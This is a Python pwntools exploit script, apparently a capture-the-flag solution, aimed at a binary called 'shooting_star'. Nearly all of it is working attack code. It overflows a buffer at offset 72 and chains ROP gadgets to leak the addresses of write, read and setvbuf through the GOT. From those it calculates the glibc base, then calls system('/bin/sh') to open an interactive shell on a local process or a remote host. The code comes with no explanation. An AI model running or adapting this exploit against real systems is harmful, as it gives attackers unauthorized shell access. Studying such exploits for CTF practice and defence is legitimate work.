#!/usr/bin/env python3

from pwn import *
from typing import List

context.binary = elf = ELF('shooting_star')
rop = ROP(elf)


def get_process():
    if len(sys.argv) == 1:
        return elf.process(), ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

    host, port = sys.argv[1].split(':')
    return remote(host, int(port)), ELF('libc6_2.27-3ubuntu1.4_amd64.so', checksec=False)


def send_rop_chain(p, rop_chain: List[int]):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'>> ', flat({72: rop_chain}))
    p.recvuntil(b'May your wish come true!\n')


def leak(p, leaked_function: str) -> int:
    send_rop_chain(p, [
        rop.rdi[0],
        1,
        rop.rsi[0],
        elf.got[leaked_function],
        0,
        elf.plt.write,
        elf.sym.main,
    ])

    leak = u64(p.recv(8))
    log.info(f'Leaked {leaked_function}() address: {hex(leak)}')
    return leak


def main():
    p, glibc = get_process()

    write_addr   = leak(p, 'write')
    read_addr    = leak(p, 'read')
    setvbuf_addr = leak(p, 'setvbuf')

    glibc.address = setvbuf_addr - glibc.sym.setvbuf
    log.success(f'Glibc base address: {hex(glibc.address)}')

    send_rop_chain(p, [
        rop.rdi[0],
        next(glibc.search(b'/bin/sh')),
        glibc.sym.system,
    ])

    p.interactive()


if __name__ == '__main__':
    main()
